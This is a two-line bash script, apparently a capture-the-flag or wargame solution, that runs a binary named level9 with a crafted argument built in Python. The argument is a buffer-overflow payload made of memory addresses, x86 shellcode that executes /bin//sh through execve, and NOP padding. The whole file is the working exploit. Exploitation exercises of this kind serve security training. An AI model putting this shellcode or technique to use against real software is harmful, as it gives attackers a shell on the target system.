#!/bin/bash
./level9 `python -c "print('\x08\x04\xa0\x10'[::-1] + '\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\x90' * 79 + '\x08\x04\xa0\x0c'[::-1])"`